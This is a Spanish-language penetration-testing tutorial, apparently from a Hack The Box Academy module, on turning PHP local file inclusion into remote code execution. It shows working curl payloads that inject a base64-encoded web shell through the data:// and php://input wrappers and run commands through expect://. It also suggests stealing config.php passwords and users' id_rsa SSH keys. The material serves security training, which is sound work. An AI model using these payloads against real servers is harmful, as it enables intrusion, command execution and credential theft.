Hasta ahora, en este módulo, hemos estado explotando vulnerabilidades de inclusión de archivos para revelar archivos locales a través de varios métodos. A partir de esta sección, comenzaremos a aprender cómo podemos utilizar vulnerabilidades de inclusión de archivos para ejecutar código en los servidores de back-end y tomar control sobre ellos.

Podemos usar muchos métodos para ejecutar comandos remotos, cada uno de los cuales tiene un caso de uso específico, ya que dependen del lenguaje/framework del back-end y de las capacidades de la función vulnerable. Un método fácil y común para ganar control sobre el servidor de back-end es enumerar credenciales de usuario y claves SSH, y luego usarlas para iniciar sesión en el servidor de back-end a través de SSH o cualquier otra sesión remota. Por ejemplo, podemos encontrar la contraseña de la base de datos en un archivo como `config.php`, que podría coincidir con la contraseña de un usuario en caso de que reutilicen la misma contraseña. O podemos revisar el directorio `.ssh` en el directorio home de cada usuario, y si los privilegios de lectura no están configurados correctamente, entonces podríamos capturar su clave privada (`id_rsa`) y usarla para iniciar sesión en el sistema a través de SSH.

Además de estos métodos triviales, hay formas de lograr la ejecución remota de código directamente a través de la función vulnerable sin depender de la enumeración de datos o de los privilegios de archivos locales. En esta sección, comenzaremos con la ejecución remota de código en aplicaciones web PHP. Construiremos sobre lo aprendido en la sección anterior y utilizaremos diferentes `PHP Wrappers` para ganar ejecución remota de código. Luego, en las próximas secciones, aprenderemos otros métodos para ganar ejecución remota de código que pueden ser utilizados con PHP y otros lenguajes también.

---

## Data

El [data](https://www.php.net/manual/en/wrappers.data.php) wrapper puede ser usado para incluir datos externos, incluyendo código PHP. Sin embargo, el data wrapper solo está disponible para usar si la configuración (`allow_url_include`) está habilitada en las configuraciones de PHP. Así que, primero confirmemos si esta configuración está habilitada leyendo el archivo de configuración de PHP a través de la vulnerabilidad LFI.

### Verificación de Configuraciones de PHP

Para hacerlo, podemos incluir el archivo de configuración de PHP que se encuentra en (`/etc/php/X.Y/apache2/php.ini`) para Apache o en (`/etc/php/X.Y/fpm/php.ini`) para Nginx, donde `X.Y` es la versión de PHP instalada. Podemos comenzar con la versión más reciente de PHP e intentar con versiones anteriores si no podemos localizar el archivo de configuración. También utilizaremos el filtro `base64` que usamos en la sección anterior, ya que los archivos `.ini` son similares a los archivos `.php` y deben ser codificados para evitar rupturas. Finalmente, usaremos cURL o Burp en lugar de un navegador, ya que la cadena de salida podría ser muy larga y deberíamos capturarla adecuadamente:



```r
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
<!DOCTYPE html>

<html lang="en">
...SNIP...
 <h2>Containers</h2>
    W1BIUF0KCjs7Ozs7Ozs7O
    ...SNIP...
    4KO2ZmaS5wcmVsb2FkPQo=
<p class="read-more">
```

Una vez que tenemos la cadena codificada en base64, podemos decodificarla y buscar (`grep`) `allow_url_include` para ver su valor:



```r
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

¡Excelente! Vemos que tenemos esta opción habilitada, así que podemos usar el `data` wrapper. Saber cómo verificar la opción `allow_url_include` puede ser muy importante, ya que `esta opción no está habilitada por defecto`, y es necesaria para varios otros ataques LFI, como el uso del `input` wrapper o para cualquier ataque RFI, como veremos a continuación. No es raro ver esta opción habilitada, ya que muchas aplicaciones web dependen de ella para funcionar correctamente, como algunos plugins y temas de WordPress, por ejemplo.

### Ejecución Remota de Código

Con `allow_url_include` habilitado, podemos proceder con nuestro ataque `data` wrapper. Como se mencionó anteriormente, el `data` wrapper puede ser usado para incluir datos externos, incluyendo código PHP. También podemos pasarle cadenas codificadas en `base64` con `text/plain;base64`, y tiene la capacidad de decodificarlas y ejecutar el código PHP.

Entonces, nuestro primer paso sería codificar en base64 un web shell PHP básico, de la siguiente manera:



```r
echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

Ahora, podemos codificar en URL la cadena en base64, y luego pasarla al data wrapper con `data://text/plain;base64,`. Finalmente, podemos pasar comandos al web shell con `&cmd=<COMMAND>`:

`http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id`

![](https://academy.hackthebox.com/storage/modules/23/data_wrapper_id.png)

También podemos usar cURL para el mismo ataque, de la siguiente manera:



```r
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Input

Similar al `data` wrapper, el [input](https://www.php.net/manual/en/wrappers.php.php) wrapper puede ser usado para incluir input externo y ejecutar código PHP. La diferencia entre él y el `data` wrapper es que pasamos nuestro input al `input` wrapper como datos de una solicitud POST. Entonces, el parámetro vulnerable debe aceptar solicitudes POST para que este ataque funcione. Finalmente, el `input` wrapper también depende de la configuración `allow_url_include`, como se mencionó anteriormente.

Para repetir nuestro ataque anterior pero con el `input` wrapper, podemos enviar una solicitud POST a la URL vulnerable y agregar nuestro web shell como datos POST. Para ejecutar un comando, lo pasaríamos como un parámetro GET, como hicimos en nuestro ataque anterior:



```r
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Nota:** Para pasar nuestro comando como una solicitud GET, necesitamos que la función vulnerable también acepte solicitudes GET (es decir, use `$_REQUEST`). Si solo acepta solicitudes POST, entonces podemos poner nuestro comando directamente en nuestro código PHP, en lugar de un web shell dinámico (por ejemplo, `<\?php system('id')?>`)

---

## Expect

Finalmente, podemos utilizar el [expect](https://www.php.net/manual/en/wrappers.expect.php) wrapper, que nos permite ejecutar comandos directamente a través de streams de URL. Expect funciona de manera muy similar a los web shells que hemos utilizado anteriormente, pero no necesitamos proporcionar un web shell, ya que está diseñado para la ejecución de comandos.

Sin embargo, expect es un wrapper externo, por lo que necesita ser instalado y habilitado manualmente en el servidor de back-end, aunque algunas aplicaciones web dependen de él para su funcionalidad central, por lo que podríamos encontrarlo en casos específicos. Podemos determinar si está instalado en el servidor de back-end de la misma manera que hicimos con `allow_url_include` anteriormente, pero buscaríamos (`grep`) `expect`, y si está instalado y habilitado obtendríamos lo siguiente:



```r
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
extension=expect
```

Como podemos ver, la palabra clave de configuración `extension` se usa para habilitar el módulo `expect`, lo que significa que deberíamos poder usarlo para obtener RCE a través de la vulnerabilidad LFI. Para usar el módulo expect, podemos usar el wrapper `expect://` y luego pasar el comando que queremos ejecutar, de la siguiente manera:



```r
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Como podemos ver, ejecutar comandos a través del módulo `expect` es bastante sencillo, ya que este módulo fue diseñado para la

 ejecución de comandos, como se mencionó anteriormente. El módulo [Web Attacks](https://academy.hackthebox.com/module/details/134) también cubre el uso del módulo `expect` con vulnerabilidades XXE, por lo que si tienes una buena comprensión de cómo usarlo aquí, deberías estar listo para usarlo con XXE.

Estos son los tres PHP wrappers más comunes para ejecutar comandos del sistema directamente a través de vulnerabilidades LFI. También cubriremos los wrappers `phar` y `zip` en las próximas secciones, que podemos usar con aplicaciones web que permiten la carga de archivos para obtener ejecución remota a través de vulnerabilidades LFI.